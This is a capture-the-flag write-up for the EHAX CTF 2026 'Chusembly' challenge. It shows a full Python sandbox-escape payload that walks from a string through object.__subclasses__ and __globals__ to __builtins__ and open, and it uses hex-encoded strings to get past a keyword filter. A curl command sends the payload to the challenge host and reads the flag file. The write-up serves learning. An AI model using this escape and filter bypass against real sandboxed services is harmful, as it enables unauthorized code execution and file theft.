@@ -1,0 +1,171 @@
+---
+title: 'EHAX CTF 2026 - Chusembly (Misc)'
+description: 'Writeup for Chusembly from EHAX CTF 2026. A miscellanious challenge involving sandbox escape and arbitrary Python code execution via an unrestricted custom assembly interpreter.'
+date: 2026-03-02
+tags: ['writeup', 'misc', 'pwn', 'python', 'sandbox-escape', 'ehax']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Category:** Miscellaneous
+**Points:** 157
+**Endpoint:** `http://chall.ehax.in:6969/`
+
+The challenge presents a custom assembly-like language interpreter named "Chusembly". The description states the flag is located in `flag.txt`, but notes the language is "restricted" with a safety check.
+
+**TL;DR:** The interpreter exposes unsafe Python object introspection via the `PROP`, `CALL`, and `IDX` instructions. Using these operations, we can traverse from a normal baseline object (like a string `"x"`) all the way up to `object.__subclasses__()`. From there, we recover a loaded class containing the `__globals__` dictionary (e.g., `warnings.catch_warnings`), extract the `__builtins__` module, acquire the `open` function, and read `flag.txt`.
+
+## 1. Initial Recon
+
+The main web page provides a runner containing an input form that posts submitted code to `/run`.
+
+A basic operational test:
+
+```asm
+LD A 1
+LD B 2
+ADD A B
+STDOUT A
+```
+
+The output confirms that code execution works as expected. 
+
+Submitting an explicitly invalid opcode intentionally leaks the allowed instruction set:
+
+```text
+['LD', 'PEEK', 'POP', 'PUSH', 'DEL', 'ADD', 'MOV', 'CMP', 'IDX', 'CALL', 'PROP', 'END', 'STDOUT']
+Error: Unknown instruction: FOO
+```
+
+Directory fuzzing additionally reveals a hidden documentation endpoint:
+- `/docs`
+- `/docs/<instruction>`
+
+This documentation is crucial because it describes internal registry behavior not immediately obvious from quick black-box testing.
+
+## 2. Chusembly Semantics
+
+Based on the `/docs` output and runtime verification, the architecture works as follows:
+
+- User-accessible registers: `A`, `B`, `C`, `D`
+- Hidden special result register: `E`
+- Register `E` cannot be directly loaded with the `LD` instruction, but many functional operations write their output implicitly into it.
+
+**Important Operational Semantics:**
+
+- `LD <reg> <value>`: Loads an integer, string, or hex-decoded string.
+- `MOV <source> <destination>`: Copies the value of the source register into the destination register.
+- `PROP <property_name> <register>`: Equivalent to `E = getattr(register, property_name)`.
+- `CALL <register>`: Invokes the callable stored in that register. Arguments are pulled from `A` and `B`, and the return result goes to `E`.
+- `IDX <source> <destination>`: Equivalent to `destination = source[A]`.
+- `CMP <r1> <r2>`: `E = 1` if equal, else `0`.
+
+**Key Weakness:** There is totally unrestricted Python attribute access (`PROP`) allowed on arbitrary objects, including dunder (double-underscore) attributes.
+
+## 3. Vulnerability Analysis
+
+The language design effectively provides a thin, vulnerable wrapper over native Python object model operations:
+
+1. `PROP` provides raw attribute access (`getattr`).
+2. `CALL` invokes arbitrary callables obtained via `PROP`.
+3. `IDX` lets us arbitrarily index Python lists, dicts, tuples, or strings.
+
+This means a classic Python sandbox escape through object graph traversal is possible.
+
+The challenge does feature a "safety filter", but it is merely lexical (keyword-based) and easily bypassable:
+- Using raw strings like `open` in the source triggers: `Unsafe code detected`.
+- However, `LD` supports native hex decoding (e.g., `0x...` translates to a UTF-8 string at runtime). Thus, blocked words can be injected directly without ever appearing literally in the source code.
+
+## 4. Exploit Strategy
+
+### 4.1 Reach Python base object and subclasses
+
+We start our traversal from a simple string literal:
+- `"x".__class__` gives us the `str` class.
+- `str.__base__` gives us the universal `object` base class.
+- `object.__subclasses__` gives us a method object.
+- `CALL`ing it returns the list of all currently loaded subclasses.
+
+### 4.2 Find a useful class with globals
+
+By enumerating the subclass names locally (or across standard runtime structures), we identify a dependable path:
+- Subclass index `241`: `catch_warnings`
+- Looking at `warnings.catch_warnings.__init__.__globals__` yields access to the module globals dictionary, which importantly includes `__builtins__`.
+
+*(Note: The exact index of `catch_warnings` can vary by Python runtime / version. In this environment, it happened to reliably sit at index 241.)*
+
+### 4.3 Recover `open` safely
+
+We use the dictionary `.get` method twice in a row:
+1. `globals.get("__builtins__")`
+2. `builtins.get("open")`
+
+To bypass the lexical safety filter, we use hex-encoded strings for the protected keywords:
+- `__builtins__` -> `0x5f5f6275696c74696e735f5f`
+- `open` -> `0x6f70656e`
+- `flag.txt` -> `0x666c61672e747874`
+
+Finally, we chain the execution:
+- `open("flag.txt")` -> Returns a file object.
+- `.read()` -> Returns the flag contents.
+
+## 5. Final Exploit Payload
+
+```asm
+LD A x
+PROP __class__ A
+PROP __base__ E
+PROP __subclasses__ E
+MOV E D
+DEL A
+DEL B
+CALL D
+LD A 241
+IDX E B
+PROP __init__ B
+PROP __globals__ E
+PROP get E
+MOV E D
+LD A 0x5f5f6275696c74696e735f5f
+DEL B
+CALL D
+MOV E C
+PROP get C
+MOV E D
+LD A 0x6f70656e
+DEL B
+CALL D
+MOV E D
+LD A 0x666c61672e747874
+DEL B
+CALL D
+PROP read E
+MOV E D
+DEL A
+DEL B
+CALL D
+STDOUT E
+```
+
+### 6. Curl Reproduction
+
+We can send this payload cleanly inside one curl command via URL-encoding:
+
+```bash
+curl -sS -X POST http://chall.ehax.in:6969/run \
+  --data-urlencode $'code=LD A x\nPROP __class__ A\nPROP __base__ E\nPROP __subclasses__ E\nMOV E D\nDEL A\nDEL B\nCALL D\nLD A 241\nIDX E B\nPROP __init__ B\nPROP __globals__ E\nPROP get E\nMOV E D\nLD A 0x5f5f6275696c74696e735f5f\nDEL B\nCALL D\nMOV E C\nPROP get C\nMOV E D\nLD A 0x6f70656e\nDEL B\nCALL D\nMOV E D\nLD A 0x666c61672e747874\nDEL B\nCALL D\nPROP read E\nMOV E D\nDEL A\nDEL B\nCALL D\nSTDOUT E'
+```
+
+**Output:**
+
+```text
+EH4X{chusembly_a1n7_7h47_7uffff_br0}
+```
+
+## 7. Flag
+
+```text
+EH4X{chusembly_a1n7_7h47_7uffff_br0}
+```
